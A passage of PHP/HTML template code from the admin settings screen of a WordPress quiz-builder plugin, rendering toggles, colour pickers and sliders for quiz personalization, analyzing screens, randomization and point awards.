			<a class="nav-link "  onclick="quiz_change_text('advanced','Certificates ');"  data-toggle="tab" href="#Quiz_setting_tab_7" role="tab" aria-controls="Quiz_setting_tab_7" aria-selected="true">Certificates </a>
		</li>
		<li class="nav-item">
			<a class="nav-link " data-toggle="tab" href="#Quiz_setting_tab_8" role="tab" aria-controls="Quiz_setting_tab_8" aria-selected="true">Email Template </a>
		</li>
	</ul>

		<div class="tab-content" id="Quiz_setting_tab_content">
			
		
			<div class="tab-pane  fade  <?php if(!isset($_GET['inner_tab'])){ echo ' show active'; }?>" id="Quiz_setting_tab_1" role="tabpanel" aria-labelledby="Quiz_setting_tab_1">			
							<div class="Restriction-Settings-content">
								<div class="Restriction-Settings-leftside">
									<h3>Select a Quiz</h3>
									<input type="text" name="sqb_search_multiple_quiz_name" id="sqb_search_multiple_quiz_name" value="" style="max-width: 100%;" placeholder="Search URL">
									<ul name="quizList" class="Quiz-Restriction-list nav nav-tabs quizList">
										<?php
											$i = 0;
											//get quiz data
											$quizdata = SQB_Quiz::load();									 
											if(isset($quizdata)){
												 foreach($quizdata as $quiz_data_single_row) {
													$quiz_id = $quiz_data_single_row->getId(); 
													$quiz_type = $quiz_data_single_row->getQuizType(); 
													$quiz_name = $quiz_data_single_row->getQuizName(); 
											?>
										<li data-value="<?php echo $quiz_id; ?>" data-title="<?php echo stripslashes($quiz_name); ?>"  data-type="<?php echo $quiz_type; ?>" class=" nav-item <?= isset($i) && $i == 0 ? 'activeli' : '' ?>" title="<?php echo stripslashes($quiz_name); ?>">
											<a class=" nav-link <?= isset($i) && $i == 0 ? 'active' : '' ?>" href="javascript:void(0);"><?php echo stripslashes($quiz_name).' (id: '.$quiz_id.')'; ?></a>
										</li>	
										<?php $i++; }
										} ?>							 
									  
									</ul>
								</div>
								<div class="quiz-card-outer-gray quiz-content-accordion">

									<div class="quiz-content-card setting_quiz_title main-quiz-info-title" style="display:none">
										<label for="" class="quiz_label"></label>
										
									</div>

									<div class="quiz-content-accordion-wrapper">	
									<h5 class="quiz--sub-title quiz-accordion-title">Personalization Options</h5>
									<div class="quiz-content-tabs-content">	
									
									
									
									<div class="quiz-content-card">
										<label for="" class="quiz_label">Do you want to ask for first name before the question screen pops up to personalize the questions?</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="show_first_name_screen" type="checkbox" id="show_first_name_screen" value="Y">
												<label for="show_first_name_screen"></label>
											</div>
										</div>
									</div>
									<div class="quiz-content-card show_first_name_screen_temp_outer" style="display:none">
										<label for="" class="quiz_label"></label>
										<div class="quiz_right-content show_first_name_screen_temp_inner">
											<div class="Quiz-Template-content"><div class="show_first_name_screen_temp"><h3 class="Quiz-Template-title sqb_tiny_mce_editor"><div>Before you begin - let me ask you for your name?This question is required. * it's nicer to be personal to people even online, isn't it?</div></h3><div class="sqb_firstname_form"><input type="text" value="" class="sqb_first_name" name="sqb_first_name" placeholder="Enter Name"><div class="sqb_first_name_ok_btn sqb_tiny_mce_editor"><div class="take-quiz-btn">OK</div></div></div></div></div>
										</div>
										<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
											<div class="Template-Customize-Setting">
												<div class="customizer_innner_sections p-0">
													<div class="Template-Customize-element personalization-ok-color">
														<div class="Template-Customize-element-inner pl-3 pr-0">
															<div class="inner_template_style_box ">
																<h4>Button color </h4>
																<div id="personalization_button_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
																	<input type="text" value="#ff634d" id="personalization_button_color" class="colorpicker-element">
																	<span class="input-group-addon"><i style="background-color: #ff634d;"></i></span>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>

										<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
											<div class="Template-Customize-Setting">
												<div class="customizer_innner_sections p-0">
													<div class="Template-Customize-element personalization-ok-color">
														<div class="Template-Customize-element-inner pl-3 pr-0">
															<div class="inner_template_style_box ">
																<h4> Input Text color </h4>
																<div id="placeholder_button_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
																	<input type="text" value="#000000" id="placeholder_button_color" class="colorpicker-element">
																	<span class="input-group-addon"><i style="background-color: #000000;"></i></span>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>
										</div>

										<div class="quiz-content-card prepopulate-firstscreen">
											<label for="" class="quiz_label">Use this to pre-populate the first name field in the opt-in form</label>
											<div class="quiz_right-content">
												<div class="square-switch_onoff">
													<input class="checkbox" name="show_firstname_outcome" type="checkbox" id="show_firstname_outcome" value="N" >
													<label for="show_firstname_outcome"></label>
												</div>
											</div>
										</div>
										<div class="shortocde_details warning_div">
											<p>This screen will show up when users click on the take this quiz button. And you can use <strong>%%FIRST%%</strong> in your questions or answers to personalize it.</p>
										</div>
									</div>
									
									<div class="startTemplateHidden" style="display:none">
										
									</div>
									<div class="startDefaultTemplateHidden" style="display:none">
										<link href="<?= plugins_url() ?>/smartquizbuilder/includes/templates/start/template2/template2.css" rel="stylesheet">

										<div class="Quiz-Template2 start_temp_outer quiz_comon_template">
										<h3 class="Quiz-Template-title sqb_tiny_mce_editor mce-content-body" id="mce_1" contenteditable="true" spellcheck="false" style="position: relative;">r_scroring</h3>	
										<span class="sqbHideStartTemplateImageOuter"><button class="sqbHideStartTemplateImage">Hide Image</button></span>
										<span class="sqbShowStartTemplateImageOuter" style="display:none"><button class="sqbShowStartTemplateImage">Show Image</button></span>
										<div class="question_img_div ui-resizable" id="start_img_temp2">	 
										<!--span class="sqb_backend_show sqb_remove_section" data-id="start_img_temp2" ><i class="fa fa-trash-o" aria-hidden="true"></i></span-->
										<img class="start_img sqb_img_draggable ui-draggable ui-draggable-handle" src="<?= plugins_url() ?>/smartquizbuilder/includes/images/start_image1.jpg" style="position: relative;">

										<span data-class="start_img" class="question_img_upload sbq_change_img"><i class="fa fa-camera" aria-hidden="true"></i></span>
										</div>

										<div class="video-element-outer startTemplateVideoOuter ui-resizable" style="display:none">
										<a href="javascript:void(0)" class="startTemplateVideoOuterLinkOver" data-toggle="modal" data-target="#video-insert">1</a>
										<div class="video-add-link startTemplateInsertVideoOuter" style="display:none">
										<a href="javascript:void(0)" class="" data-toggle="modal" data-target="#video-insert"><i class="fa fa-file-video-o" aria-hidden="true"></i> Insert Video</a>
										</div>
										<div class="startTemplateYoutubeVideoOuter" style="display:none">
										<div class="fluid-width-video-wrapper" style="padding-top: 56.25%;"><iframe src="" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" name="fitvid0"></iframe></div>
										</div>
										<div class="external-videoWrapper startTemplateCommonVideoOuter" style="display:none">
										<video width="400" controls="">
										</video>
										</div>
										</div>

										<div class="Quiz-Template-content">
										<div class="sqb_tiny_mce_editor sqb_content mce-content-body" id="mce_2" contenteditable="true" spellcheck="false" style="position: relative;"><div>r_scroring</div></div>  
										<div class="take-quiz-btn sqb_tiny_mce_editor  mce-content-body" id="mce_3" contenteditable="true" spellcheck="false" style="position: relative; background-color: rgb(60, 31, 28);"><div>TAKE THIS QUIZ</div></div>		 								
										</div>	 
										</div>
										<!--<span class="sqb_edit_template " data-toggle="modal" data-target="#myModalStart" title="Change the Template"><b>...</b></span>
										<span class="sqb_edit_template " data-toggle="modal" data-target="#myModalStart" title="Change the Template"><b>...</b></span>
										<span class="sqb_edit_template " data-toggle="modal" data-target="#myModalStart" title="Change the Template"><b>...</b></span> -->
									</div>
								<?php /*				
									<div class="quiz-content-card">
										<label for="" class="quiz_label">Set Time Limit for Quiz?</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="quiz_timer" type="checkbox" id="quiz_timer" value="Y" checked="checked">
												<label for="quiz_timer"></label>
											</div>
										</div>
									</div>
									
									
									<div class="quiz-content-card quiz_timer_limit_div">
										<label for="" class="quiz_label">Specify a Quiz Time Limit</label>
										<div class="quiz_right-content">
											<input type="text" name="quiz_timer_limit" id="quiz_timer_limit">
										</div>
									</div>
									*/?>
									<div class="quiz-content-card" style="display:none!important;">
										<label for="" class="quiz_label">Attempts Allowed</label>
										<div class="quiz_right-content">
											<select name="quiz_attempts_allowed" id="quiz_attempts_allowed">
												<option  value="N" <?php  echo "selected='selected'";?>>No re-attempts</option>
												<option value="Y" >Allow users to re-attempt quiz</option>
												
											</select>
										</div>
									</div>
										
									<div class="quiz-content-card quiz_attempts_allowed_outer_option" style="display:none!important;">
										<label for="" class="quiz_label">What should be displayed to logged-in members that have already taken the quiz?</label>
										<div class="quiz_right-content">
											<select name="already_take_the_quiz" id="already_take_the_quiz">
												<option value="start_screen" <?php  echo "selected='selected'"; ?>>Show the start screen</option>
												<option value="retake_quiz" >Replace the Take this quiz with "Retake this Quiz"</option>
												<option  value="show_question_and_selected_ans">Show the questions and selected answers</option>
											</select>
										</div>
									</div>
									
									<div class="quiz-content-card quiz_attempts_allowed_outer_option total_attempts_cls_outer" style="display:none">
										<label for="" class="quiz_label">Total Attempts </label>
										<div class="quiz_right-content">
											<input class="total_attempts_cls" name="total_attempts" type="number" id="total_attempts" value="10" > 
										</div>
									</div>
								</div>
							</div>
									 <?php /*
									<div class="quiz-content-card">
										<label for="" class="quiz_label">Do you want to grade the quiz</label>
										<div class="quiz_right-content">
											<label class="radio-btn--outer"><input type="radio" name="grade_quiz" value="Y">Yes</label>
											<label class="radio-btn--outer"><input type="radio" name="grade_quiz" value="N" checked>No</label>									
										</div>
									</div>

									<div class="quiz-content-card quiz_passmark_div" style="display:none">
										<label for="" class="quiz_label">Enter Pass %</label>
										<div class="quiz_right-content">
											<input type="text" name="quiz_passmark" id="quiz_passmark">
										</div>
									</div>
									*/?>

									
									
									<!--div class="quiz-content-card show_correct_ans_opiton_div_outer" style="display:none">
										<label for="" class="quiz_label">where to show ?</label>
										<div class="quiz_right-content">
											<select name="show_correct_ans_option">
													<option value='last_page' >Last Page</option>
													<option value='same_page' >Same Page</option>
												</select>
										</div>
									</div-->
									<!-- --------------- -->
									<div class="quiz-content-accordion-wrapper">	
									<h5 class="quiz--sub-title quiz-accordion-title">Analyzing Screen before Outcome</h5>
									<div class="quiz-content-tabs-content">	
									<div class="quiz-content-card analyzing-screen">
										<label for="" class="quiz_label">Do you want to show analyzing result page? <div class="tool-tip">
									<i class="fa fa-info-circle" aria-hidden="true"></i>
									<div class="toll-tip-desc">If enabled, this screen will be displayed AFTER users opt-in but BEFORE the outcome is displayed.</div>
								</div></label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="analyzing_result" type="checkbox" id="analyzing_result" value="N" >
												<label for="analyzing_result"></label>
											</div>
										</div>
									</div>

									<div class="quiz-content-card show_analyzing_result_outer" style="display:none">
																		
										<div class="quiz_right-content show_analyzing_result_inner">
											<div class="Quiz-Template-content">

												<div class="analyzing_result_temp" style="text-align: center;">
													<div class="analyzing_result_content">
														<h3 class="analyzing_result_title sqb_tiny_mce_editor">Title will be here</h3>
														<p class="sqb_tiny_mce_editor">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
													</div>

													<div class="analyzing_result_progress">
														<h4>Analyzing Your Results...</h4>
														<div class="progress">
														  	<div class="analyzing-progress-bar" role="progressbar" style="width: 50%;background-color:#007bff;" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
														</div>
														<p class="analyzing_result_note">* Do Not Leave The Page or Reload The Page *</p>
													</div>
													<input type="hidden" name="time-delay-hidden" class="time-delay-hidden" value='3'>
												</div>
											</div>
											<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
													<div class="Template-Customize-Setting">
														<div class="customizer_innner_sections p-0">
															<div class="Template-Customize-element">
																<div class="Template-Customize-element-inner pl-0 pr-0">
																	<div class="inner_template_style_box">
																		<h4>Time Delay <div class="tool-tip">
																			<i class="fa fa-info-circle" aria-hidden="true"></i>
																			<div class="toll-tip-desc">Display progress bar for this much time</div>
																		</div></h4>
																		<div class="d-flex align-items-center"><input type="number" class="analyzing-result-time-delay form-control" value="3">
                                                                           <label class="m-0 ml-2">secs</label></div>
																	</div>
																	<div class="inner_template_style_box ">
																		<h4>Progress bar color </h4>
																		<div id="analyzing_result_progress_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
																			<input type="text" value="#007bff" id="analyzing_result_progress_color">
																			<span class="input-group-addon"><i style="background-color: #007bff;"></i></span>
																		</div>
																	</div>
																	<div class="inner_template_style_box">
																		<h4>Content alignment</h4>
																		<select id="analyzing_result_alignment" class="form-control">
																			<option value="left">Left</option>
																			<option value="center" selected>Center</option>
																			<option value="right">Right</option>
																		</select>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
										</div>
									</div>
								</div>
								</div>
									<!-- -------------------- -->
									<div class="quiz-content-accordion-wrapper">	
									<h5 class="quiz--sub-title quiz-accordion-title">Background Color / Width</h5>
									<div class="quiz-content-tabs-content">	
									<div class="quiz-content-card all-background-settings">
										<div class="quiz_right-content">
											<div class="inner_template_style_box ">
												<h4>Tag Background </h4>
												<label for="" class="background-label">It'll be used if you display tag description on the outcome screen. Tag description will be shown in a frame with this background color.</label>
												<div id="setting_tag_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_tag_background_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>

												<div class="inner-width-options">
													<div class="d-flex align-items-center">
														<p>
															<input id="tag_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="400" data-slider-max="2000" data-slider-step="1" data-slider-value="100" />
														</p>

														<div class="slider-user-value">
															<input type="text" class="tag_width_input" name="tag_width_input" value="900">
															<p class="px-value">px</p>
														</div>
													</div>
												</div>

											</div>

											<div class="inner_template_style_box ">
												<h4>Category Background </h4>
												<label for="" class="background-label">It'll be used if you display category description on the outcome screen. Category description will be shown in a frame with this background color.</label>

												<div id="setting_category_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_category_background_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
												<div class="inner-width-options">
													<div class="d-flex align-items-center">
														<p>
															<input id="category_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="400" data-slider-max="2000" data-slider-step="1" data-slider-value="100" />
														</p>

														<div class="slider-user-value">
															<input type="text" class="category_width_input" name="category_width_input" value="900">
															<p class="px-value">px</p>
														</div>
													</div>
												</div>

											</div>

											<div class="inner_template_style_box ">
												<h4>Answer Recommendation / Ad </h4>
												<label for="" class="background-label">It'll be used if you display answer level recommendations. The recommendations will be shown in a frame with this background color.</label>

												<div id="setting_ans_ad_recommendation_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_ans_ad_recommendation">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Question Ads </h4>
												<label for="" class="background-label">It'll be used if you display question level recommendations. The recommendations will be shown in a frame with this background color.</label>

												<div id="setting_question_ads_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_question_ads_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
												<div class="inner-width-options">
													<div class="d-flex align-items-center">
														<p>
															<input id="question_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="400" data-slider-max="2000" data-slider-step="1" data-slider-value="100" />
														</p>

														<div class="slider-user-value">
															<input type="text" class="question_width_input" name="question_width_input" value="900">
															<p class="px-value">px</p>
														</div>
													</div>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Personalization (First Name)</h4>
												<label for="" class="background-label">It'll be used if you ask for first name first and have enabled it in the personalization section above.</label>

												<div id="setting_personalization_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_personalization_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
												<div class="inner-width-options">
													<div class="d-flex align-items-center">
														<p>
															<input id="personalization_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="400" data-slider-max="2000" data-slider-step="1" data-slider-value="100" />
														</p>

														<div class="slider-user-value">
															<input type="text" class="personalization_width_input" name="personalization_width_input" value="900">
															<p class="px-value">px</p>
														</div>
													</div>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Analyzing Screen (Background) </h4>
												<label for="" class="background-label">It'll be used if you use the analyzing screen feature.</label>

												<div id="setting_analyzing_screen_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_analyzing_screen_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
												<div class="inner-width-options">
													<div class="d-flex align-items-center">
														<p>
															<input id="analyzing_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="400" data-slider-max="2000" data-slider-step="1" data-slider-value="100" />
														</p>

														<div class="slider-user-value">
															<input type="text" class="analyzing_width_input" name="analyzing_width_input" value="900">
															<p class="px-value">px</p>
														</div>
													</div>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Progress Bar Active(Background) </h4>
												<label for="" class="background-label">It'll be used if you use the progress bar feature.</label>

												<div id="setting_progress_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(79,108,191,1)" id="setting_progress_color">
													<span class="input-group-addon"><i style="background-color: rgba(79,108,191,1);"></i></span>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Progress Bar Inactive (Background) </h4>
												<label for="" class="background-label">It'll be used if you use the progress bar feature.</label>

												<div id="setting_progress_inactive_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="setting_progress_inactive_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
											</div>

											<div class="inner_template_style_box ">
												<h4>Charts Bar (Background) </h4>
												<label for="" class="background-label">It'll be used if you use the charts bar feature.</label>

												<div id="charts_bar_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="charts_bar_background_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
											</div>

											<div class="inner_template_style_box top_bar_bg_color">
												<h4>Top Bar background color </h4>
												<label for="" class="background-label">It'll be used if you use template3 and template4.</label>

												<div id="top_bar_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(245, 102, 64, 1)" id="top_bar_background_color">
													<span class="input-group-addon"><i style="background-color: rgba(245, 102, 64, 1);"></i></span>
												</div>
											</div>

											<!-- <div class="inner_template_style_box hide-for-template8">
												<h4>Next Button </h4>
												<label for="" class="background-label">It'll be used if you use next button feature.</label>

												<div id="next_button_settings_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="rgba(255,255,255,1)" id="next_button_settings_background_color">
													<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
												</div>
											</div> -->

										</div>	
									</div>
								</div>
							</div>
									<!-- -------------------- -->
									
								<div class="quiz-content-accordion-wrapper" style="display:none;">	
									<h5 class="quiz--sub-title quiz-accordion-title">Button Customizer</h5>
									<div class="quiz-content-tabs-content">	
										<div class="quiz-content-card next-btn-settings">
											<div class="quiz_right-content">
												<div class="quiz-card-outer-gray restriction_settings">
													<h5 class="quiz--sub-title mt-2">Next Button  </h5>
													<div class="next_temp_container next_template_html_preview_outer">
														
													</div>
														<!--Customizer Start-->
													<div class="Template-Customize-setting-outer Template-Customize-horizontal-style">
														 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">

															<div class="customizer_innner_sections">
																<div class="Template-Customize-element">
																	<div class="Template-Customize-element-inner element_paddings">
																		<div class="inner_template_style_box">
																			<h4>Width</h4>
																			<p>
																				<input id="nexttbtn_width_for_quiz" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="100" />
																			</p>
																		</div>
																		
																		<div class="inner_template_style_box ">
																			<h4>Height</h4>
																			<p>
																				<input id="nexttbtn_height_for_quiz" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="12" />
																			</p>
																		</div>
																		
																		<div class="inner_template_style_box ">
																			<h4>Background </h4>
																			<div id="next_button_settings_background_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
																				<input type="text" value="rgba(255,255,255,1)" id="next_button_settings_background_color">
																				<span class="input-group-addon"><i style="background-color: rgba(255,255,255,1);"></i></span>
																			</div>
																		</div>
																	</div>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>	
										</div>
										<div class="quiz-card-outer-gray skip_question_wrapper_for_quiz restriction_settings">
											<h5 class="quiz--sub-title mt-2">Skip Question Button  </h5>
											<div class="skip_question_temp_container skip_question_template_html_preview_outer">
																							
											</div>
												<!--Customizer Start-->
											<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
												 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
													

													<div class="customizer_innner_sections">
														<div class="Template-Customize-element">
															<div class="Template-Customize-element-inner element_paddings">
																<div class="inner_template_style_box">
																	<h4>Width</h4>
																	<p>
																		<input id="skip_question_btn_width_for_quiz" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="900" data-slider-step="1" data-slider-value="" />
																	</p>
																</div>
																
																<div class="inner_template_style_box ">
																	<h4>Height</h4>
																	<p>
																		<input id="skip_question_btn_height_for_quiz" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="200" data-slider-step="1" data-slider-value="" />
																	</p>
																</div>
																
																<div class="inner_template_style_box ">
																	<h4>Background </h4>
																	<div id="skip_question_button_for_quiz_div" class="input-append color input-group colorpicker-component colorpicker-element">
																		<input type="text" value="rgba(255,255,255,1);" id="skip_question_button_for_quiz">
																		<span class="input-group-addon"><i style="background-color:rgba(255,255,255,1);"></i></span>
																	</div>
																	
																</div>
															</div>
														</div>
													</div>
												
												</div>
												
											</div>
											<!--Customizer ends-->
										</div>
									</div>
								</div>




									<!-- -------------------- -->









									<div class="quiz-content-accordion-wrapper">	
										<h5 class="quiz--sub-title  quiz-accordion-title">Randomize Question / Answers</h5>
										<div class="quiz-content-tabs-content">	
											<div class="quiz-content-card">
												<label for="" class="quiz_label">Are the questions random?</label>
												<div class="quiz_right-content">
													<div class="square-switch_onoff">
														<input class="checkbox" name="questions_random" type="checkbox" id="questions_random" value="Y" >
														<label for="questions_random"></label>
													</div>
												</div>
											</div>
											<div class="quiz-content-card">
												<label for="" class="quiz_label">Are the answers random?</label>
												<div class="quiz_right-content">
													<div class="square-switch_onoff">
														<input class="checkbox" name="answers_random" type="checkbox" id="answers_random" value="Y">
														<label for="answers_random"></label>
													</div>
												</div>
											</div> 
										</div>
									</div>
									<!-- -------------------- -->
									<div class="quiz-content-accordion-wrapper">	
									<h5 class="quiz--sub-title  quiz-accordion-title">Other Settings</h5>
									<div class="quiz-content-tabs-content">	
									<h5 class="quiz--sub-title">Upon answer selection, move to the top of the next screen</h5>
									<div class="quiz-content-card">
										<!-- <label for="" class="quiz_label">Are the questions random?</label> -->

										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="move_question" type="checkbox" id="move_question" value="Y">
												<label for="move_question"></label> 
											</div>
										</div>	
									</div>

									<!-- -------------------- -->
																		
									
									<h5 class="quiz--sub-title">Quiz Points</h5>
									<?php 
									if (function_exists('is_plugin_active') && is_plugin_active('gameofpoints/gameofpoints.php') ) {
									} else {
										echo "<input type='hidden' id='gop_exists' name='gop_exists' value='N'>";
									}
									?>
									
									<div class="quiz-content-card">
										<label for="" class="quiz_label">Do you want to give your members/students points when they complete the quiz?</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="give_points_on_complete" type="checkbox" id="give_points_on_complete" value="Y" data-quiz-type="">
												<label for="give_points_on_complete"></label>
											</div>
										</div>
										<div class="shortocde_details warning_div check_gop_availability mt-3" style="display:none">
											<p>This feature will only work if you have GameOfPoints.com plugin installed/Activated</p>
										</div>
									</div>
									
									<div class="quiz-content-card quiz_points quiz_how_many_points_outer" style="display:none;">
										<label for="" class="quiz_label">How many points: </label>
										<div class="quiz_right-content">
											<input type="text" name="quiz_how_many_points" id="quiz_how_many_points" value="" style="width: 66px;">
										</div>
									</div>
									
									<div class="quiz-content-card quiz_points give_points_on_quiz_pass_outer" style="display:none;">
										<label for="" class="quiz_label">Should the points be awarded ONLY if users pass the quiz?</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="give_points_on_quiz_pass" type="checkbox" id="give_points_on_quiz_pass" value="Y" data-quiz-type="">
												<label for="give_points_on_quiz_pass"></label>
											</div>
										</div>
									</div>
									<div class="quiz-content-card quiz_points quiz_passing_score_outer" style="display:none;">
										<label for="" class="quiz_label">Passing Score: </label>
										<div class="quiz_right-content">
											<input type="text" name="quiz_passing_score" id="quiz_passing_score" value="" style="width: 66px;">%
										</div>
									</div>
									<div class="quiz-content-card quiz_points quiz_correct_answers_outer" style="display:none;">
										<label for="" class="quiz_label">Correct Answers: </label>
										<div class="quiz_right-content">
											<input type="text" name="quiz_correct_answers" id="quiz_correct_answers" value="" style="width: 66px;">
										</div>
									</div>
									
									<div class="quiz-content-card quiz_points give_points_on_retake_outer" style="display:none;">
										<label for="" class="quiz_label">Do you want to give points if users don't pass the quiz initially but later pass it on a retake attempt.</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="give_points_on_retake" type="checkbox" id="give_points_on_retake" value="Y" >
												<label for="give_points_on_retake"></label>
											</div>
										</div>
									</div>
									
									<div class="quiz-content-card quiz_points quiz_points_display_message_outer">
										<label for="" class="quiz_label">Display Message</label>
										<div class="quiz_right-content">
											<div class="sqb_display_message_box sqb_tiny_mce_editor"><div style="text-align:left">Congrats! You have earned %%POINTS%% point(s) by completing this quiz.</div></div>
											
										</div>
									</div>
									
									<div class="quiz-content-card" style="display:none!important;">
										<label for="" class="quiz_label">Should the user be required to be logged in to take this quiz?</label>
										<div class="quiz_right-content">
											<div class="square-switch_onoff">
												<input class="checkbox" name="show_for_notloggedin_user" type="checkbox" id="show_for_notloggedin_user" value="Y">
												<label for="show_for_notloggedin_user"></label>
											</div>
										</div>
									</div>
									 
									</div>
									</div> 
									
								</div>
							</div>
					 		<div class="question_error_msg_outer quiz-save-setting-error" style="display: none;">
								<div class="question_error_msg">Please NOTE: Can't use Randomize Question in a calculator because if users take a different path, some of the formulas won't work.
								</div>
							</div>
							  
							 <div class="quiz-actions justify-content-center">
								<!--a href="javascript:void(0)" class="quiz--btn quiz-prev-btn" onclick="sqb_next_tab('Basic-Settings')"> Previous </a-->
								<!--a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_quiz('Restriction-Settings')"> Save </a-->
								<a href="javascript:void(0)" class="quiz--btn quiz-save-btn" onclick="sqb_save_quiz_setting()"> Save </a>
								<!--a href="javascript:void(0)" class="quiz--btn quiz-next-btn" onclick="sqb_next_tab('Display-Settings')"> Next </a-->
							</div>
						</div>
			<div class="tab-pane  fade " id="Quiz_setting_tab_2" role="tabpanel" aria-labelledby="Quiz_setting_tab_2">
				<?php 
					$category_info = SQBGetQuizCategoryTableHtml();
					if(isset($category_info['html'])){
						echo $category_info['html'];
					}
						
				?>
			</div>
			
			<div class="tab-pane  fade " id="Quiz_setting_tab_3" role="tabpanel" aria-labelledby="Quiz_setting_tab_3">
				<div class="quiz-card-outer-gray-wrapper">
					<div class="quiz-card-outer-gray">
							<div class="quiz-content-card">
								<?php $sqb_optimized_js_css = get_option('sqb_newflow'); 
								
								$sqb_optimized_js_css_checked = "";
								if(isset($sqb_optimized_js_css) && $sqb_optimized_js_css == 'Y'){
									$sqb_optimized_js_css_checked = "checked='checked'";
								}

								?>
								<label for="" class="quiz_label">Use the optimized JS/CSS flow: <small style="width: 100%; font-size: 13px;padding: 10px 10px 10px 10px;height: auto; line-height: normal; background-color: #f2fffb; border-color: #43bbdf; float: none; text-align: left; border: 1px solid #ddd;  font-weight: 500; border-radius: 4px; color: #444; border-left: 3px solid #17d3b3 !important; margin: 12px 0; display: block; vertical-align: middle;">We've fully optimized css/js in SQB for better performance / speed etc.</small></label> <div class="quiz_right-content">
									<div class="square-switch_onoff">
										<input class="checkbox" name="sqb_optimized_js_css_enable" type="checkbox" id="sqb_optimized_js_css_enable" value="N" <?php echo $sqb_optimized_js_css_checked; ?>>
										<label for="sqb_optimized_js_css_enable"></label>
									</div>
								</div>
							</div>
					 </div>


					<div class="quiz-card-outer-gray">
							<div class="quiz-content-card">
								<?php $sqb_wp_syncing = get_option('sqb_wp_syncing'); 
								$global_settins_checked = "";
								if(isset($sqb_wp_syncing) && $sqb_wp_syncing == 'Y'){
								$global_settins_checked = "checked='checked'";
								}
								?>
								<label for="" class="quiz_label">Do you want to disable WordPress sync? <small style="width: 100%; float: left; font-size: 13px;  padding-bottom: 6px;">By default, SQB adds users to WordPress users table. But if syncing is disabled, SQB will add users to it's own tables and not add to WordPress users table. All other functionality will work fine.</small></label>
								<div class="quiz_right-content">
									<div class="square-switch_onoff">
										<input class="checkbox" name="sqb_disable_wp_sync" type="checkbox" id="sqb_disable_wp_sync" value="N" <?php echo $global_settins_checked; ?>>
										<label for="sqb_disable_wp_sync"></label>
									</div>
								</div>
							</div>
					 </div>

					 <?php $exit_popup_timer = sqbGetValidSettingsByKey('exit_popup_timer');
